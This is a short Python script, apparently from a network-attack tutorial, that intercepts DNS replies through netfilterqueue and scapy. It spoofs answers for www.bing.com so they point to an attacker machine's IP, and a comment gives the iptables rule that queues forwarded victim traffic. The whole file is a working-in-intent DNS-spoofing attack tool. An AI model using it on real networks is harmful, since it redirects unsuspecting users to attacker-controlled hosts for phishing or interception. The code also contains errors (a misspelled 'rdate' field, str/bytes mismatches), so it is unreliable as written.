import netfilterqueue as net
import scapy.all as scapy


def process_packet(packet):
    scapy_packets = scapy.IP(packet.get_payload())
    if scapy_packets.haslayer(scapy.DNSRR):
        qname = scapy_packets[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print(f"[+] Spoofing target: ")
            answer = scapy.DNSRR(rrname=qname, rdate="192.168.159.134")
            # modify the response packet
            # rrname = website to be visited, rdate = attacking machine IP
            scapy_packets[scapy.DNS].an = answer
            # overwrite the spoofed packet to the DNS 'an' packet
            scapy_packets[scapy.DNS].ancount = 1

            del scapy_packets[scapy.IP].len
            del scapy_packets[scapy.IP].chksum
            del scapy_packets[scapy.UDP].len
            del scapy_packets[scapy.UDP].chksum

            packet.set_payload(str(scapy_packets))
            # change the original packet to modified packet
    packet.accept()
    """
    packet.accept()  # the packet will be sent to the target
    packet.drop()  #drop the packet at here
    """
    # iptables -I FORWARD -j NFQUEUE --queue-num 0


queue = net.NetfilterQueue()
queue.bind(0, process_packet)
# connect the queue created in system and call back
# the function process_packet
queue.run()
